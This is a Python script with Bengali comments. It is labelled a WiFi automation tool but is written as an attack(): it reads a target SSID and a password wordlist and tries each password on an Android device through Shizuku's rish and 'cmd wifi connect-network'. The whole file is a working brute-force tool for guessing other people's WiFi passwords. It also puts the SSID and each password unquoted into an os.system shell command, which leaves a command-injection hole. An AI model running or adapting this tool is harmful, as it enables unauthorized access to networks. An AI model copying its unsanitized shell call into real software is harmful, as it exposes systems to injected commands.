import os
import time

def banner():
    print("="*40)
    print("   CUSTOM WIFI AUTOMATION TOOL v1.0   ")
    print("      Powered by Shizuku & Termux     ")
    print("="*40)

def attack():
    banner()
    # ব্যবহারকারীর কাছ থেকে ইনপুট নেওয়া
    ssid = input("[+] Target WiFi SSID: ")
    wordlist = input("[+] Wordlist File Path (e.g., pass.txt): ")

    # ফাইলটি আছে কি না চেক করা
    if not os.path.exists(wordlist):
        print(f"[-] Error: {wordlist} not found!")
        return

    # পাসওয়ার্ড ট্রাই করা শুরু
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            
            # অ্যান্ড্রয়েড সিকিউরিটি অনুযায়ী ৮ অক্ষরের কম পাসওয়ার্ড হয় না
            if len(password) < 8:
                continue
                
            print(f"[*] Testing: {password}")
            
            # সরাসরি সিস্টেম কমান্ড (No Virtual Click)
            # Shizuku-র rish ব্যবহার করে কমান্ড ইনজেকশন
            cmd = f'./rish -c "cmd wifi connect-network {ssid} wpa2 {password}"'
            os.system(cmd)
            
            # প্রসেসরের ওপর চাপ কমাতে বিরতি (Efficiency logic)
            time.sleep(2) 

if __name__ == "__main__":
    attack()
